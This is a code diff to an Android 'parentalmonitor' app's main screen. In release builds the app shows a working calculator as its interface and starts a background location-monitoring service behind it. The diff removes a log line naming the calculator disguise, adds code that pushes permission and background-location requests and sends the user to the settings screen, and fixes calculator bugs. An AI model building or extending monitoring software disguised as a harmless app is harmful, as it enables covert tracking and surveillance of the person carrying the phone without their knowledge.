@@ -17,6 +17,9 @@ import com.redeye.parentalmonitor.BuildConfig
 class MainActivity : AppCompatActivity() {
 
     private lateinit var preferencesManager: PreferencesManager
+    private var permissionAsked = false
+    private var backgroundAsked = false
+    private var settingsRedirected = false
 
     private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
         arrayOf(
@@ -55,6 +58,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun tryStartAfterPermissions() {
+        if (!::preferencesManager.isInitialized) return
         if (!BuildConfig.DEBUG && preferencesManager.isConfigured() && preferencesManager.userConsentedMonitoring && !preferencesManager.userDisabledMonitoring && hasBackgroundLocation()) {
             if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
                 try {
@@ -92,9 +96,20 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    override fun onSaveInstanceState(outState: Bundle) {
+        super.onSaveInstanceState(outState)
+        outState.putBoolean("permissionAsked", permissionAsked)
+        outState.putBoolean("backgroundAsked", backgroundAsked)
+        outState.putBoolean("settingsRedirected", settingsRedirected)
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
+        if (savedInstanceState != null) {
+            permissionAsked = savedInstanceState.getBoolean("permissionAsked", false)
+            backgroundAsked = savedInstanceState.getBoolean("backgroundAsked", false)
+            settingsRedirected = savedInstanceState.getBoolean("settingsRedirected", false)
+        }
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "DEBUG mode")
         
@@ -102,7 +117,6 @@ class MainActivity : AppCompatActivity() {
         preferencesManager = PreferencesManager.getInstance(this)
 
         if (!BuildConfig.DEBUG) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
             setContentView(R.layout.activity_calculator)
             initCalculator()
             startMonitoringInBackground()
@@ -142,19 +156,19 @@ class MainActivity : AppCompatActivity() {
         // Number buttons
         val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
         digitViews.forEachIndexed { index, viewId ->
-            findViewById<android.widget.Button>(viewId).setOnClickListener { appendNumber(index.toString()) }
+            findViewById<android.widget.Button>(viewId)?.setOnClickListener { appendNumber(index.toString()) }
         }
-        findViewById<android.widget.Button>(R.id.btnDot).setOnClickListener { appendNumber(".") }
+        findViewById<android.widget.Button>(R.id.btnDot)?.setOnClickListener { appendNumber(".") }
         
         // Operator buttons
-        findViewById<android.widget.Button>(R.id.btnPlus).setOnClickListener { setOperator("+") }
-        findViewById<android.widget.Button>(R.id.btnMinus).setOnClickListener { setOperator("−") }
-        findViewById<android.widget.Button>(R.id.btnMultiply).setOnClickListener { setOperator("×") }
-        findViewById<android.widget.Button>(R.id.btnDivide).setOnClickListener { setOperator("÷") }
+        findViewById<android.widget.Button>(R.id.btnPlus)?.setOnClickListener { setOperator("+") }
+        findViewById<android.widget.Button>(R.id.btnMinus)?.setOnClickListener { setOperator("−") }
+        findViewById<android.widget.Button>(R.id.btnMultiply)?.setOnClickListener { setOperator("×") }
+        findViewById<android.widget.Button>(R.id.btnDivide)?.setOnClickListener { setOperator("÷") }
         
         // Function buttons
-        findViewById<android.widget.Button>(R.id.btnEquals).setOnClickListener { calculate() }
-        findViewById<android.widget.Button>(R.id.btnClear).setOnClickListener { clear() }
+        findViewById<android.widget.Button>(R.id.btnEquals)?.setOnClickListener { calculate() }
+        findViewById<android.widget.Button>(R.id.btnClear)?.setOnClickListener { clear() }
         
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Calculator initialized")
     }
@@ -189,7 +203,11 @@ class MainActivity : AppCompatActivity() {
     
     private fun setOperator(op: String) {
         justCalculated = false
-        if (currentNumber.isEmpty() || currentNumber == "Error") return
+        if (currentNumber == "Error") {
+            clear()
+            return
+        }
+        if (currentNumber.isEmpty()) return
         if (previousNumber.isNotEmpty()) {
             calculate()
             if (currentNumber == "Error" || currentNumber.isEmpty()) return
@@ -298,9 +316,17 @@ class MainActivity : AppCompatActivity() {
             return
         }
         
-        // Silently request permissions if needed
         if (!hasAllPermissions()) {
-            android.util.Log.w("MainActivity", "Permissions missing - waiting for Setup")
+            android.util.Log.w("MainActivity", "Permissions missing - requesting")
+            if (permissionAsked) {
+                redirectToSettingsOnce()
+                return
+            }
+            permissionAsked = true
+            try {
+                permissionLauncher.launch(requiredPermissions)
+            } catch (_: Exception) {
+            }
             return
         }
         
@@ -310,7 +336,18 @@ class MainActivity : AppCompatActivity() {
             return
         }
         if (!hasBackgroundLocation()) {
-            android.util.Log.w("MainActivity", "Background location missing - waiting for Setup")
+            android.util.Log.w("MainActivity", "Background location missing - requesting")
+            if (backgroundAsked) {
+                redirectToSettingsOnce()
+                return
+            }
+            backgroundAsked = true
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    backgroundPermissionLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                }
+            } catch (_: Exception) {
+            }
             return
         }
         if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
@@ -326,6 +363,21 @@ class MainActivity : AppCompatActivity() {
         }
     }
     
+    private fun redirectToSettingsOnce() {
+        if (settingsRedirected) return
+        settingsRedirected = true
+        Toast.makeText(this, getString(R.string.msg_permissions_denied), Toast.LENGTH_LONG).show()
+        try {
+            startActivity(
+                Intent(
+                    android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                    android.net.Uri.parse("package:$packageName")
+                )
+            )
+        } catch (_: Exception) {
+        }
+    }
+
     private fun hasAllPermissions(): Boolean {
         return requiredPermissions.all { permission ->
             ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
